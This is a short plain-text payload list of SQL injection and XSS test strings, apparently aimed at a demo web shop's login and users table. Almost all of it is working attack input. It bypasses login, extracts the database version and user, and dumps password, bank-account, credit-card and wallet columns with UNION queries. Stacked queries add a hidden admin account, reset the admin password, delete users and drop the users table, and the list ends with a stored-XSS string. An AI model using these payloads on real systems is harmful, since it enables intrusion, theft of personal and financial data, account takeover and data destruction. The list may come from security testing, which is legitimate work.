########## SQLi TESTING ##########

Username for login as first available user
' OR '1'='1
' OR '1'='1' --

Login exploit know the username
' OR username='admin' --
' OR username = 'wick.johnathan'--

Get db version
' UNION SELECT 1, version(), 'x', 'x', 'x', 'x', '2000-01-01', 'x', 'x', 'x', 'x', 0.0, 'x', 'x', 0 --

Get db name
' UNION SELECT 1, database(), 'x', 'x', 'x', 'x', '2000-01-01', 'x', 'x', 'x', 'x', 0.0, 'x', 'x', 0 --

Get current mysql user (root@localhost)
' UNION SELECT 1, user(), 'x', 'x', 'x', 'x', '2000-01-01', 'x', 'x', 'x', 'x', 0.0, 'x', 'x', 0 --

Extract all columns from user table
' UNION SELECT id, username, password, full_name, email, phone_number, date_of_birth, shipping_address, bank_account_number, credit_card_number, paypal_info, wallet_amount, wallet_password, bought_items, is_admin FROM users --

Show all users
' OR '1'='1' --

----- Multiple Statements:

Backdoor creation
'; INSERT INTO users(username, password, is_admin) VALUES('hacker', 'pass123', 1);--

Modify or delete data
'; UPDATE users SET password='newpass' WHERE username='admin';--

'; DELETE FROM users WHERE username='admin';--
'; DROP TABLE users;--

Create or modify database objects
'; CREATE TABLE backdoor(id INT PRIMARY KEY, secret VARCHAR(100));--

########## XSS TESTING ##########
Persistent XSS attempt in demo
'<a href="#" onclick="alert(''XSS Executed!''); return false;">Click me!</a>'
